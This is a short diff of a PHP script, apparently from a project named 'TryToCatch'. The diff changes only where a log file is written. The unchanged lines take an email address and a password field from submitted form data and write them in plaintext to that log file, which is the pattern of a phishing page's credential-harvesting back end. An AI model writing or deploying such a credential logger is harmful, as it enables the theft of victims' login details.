@@ -1,6 +1,6 @@
 <?php
 
-$path = __DIR__ . "/log.txt";
+$path = "/home/lioren/PycharmProjects/TryToCatch/log.txt";
 $dataname = "Username: " . $_POST['email'] . "\n";
 $datapass = "Pass: " . $_POST['passContainer'] . "\n";
 file_put_contents($path, $dataname);
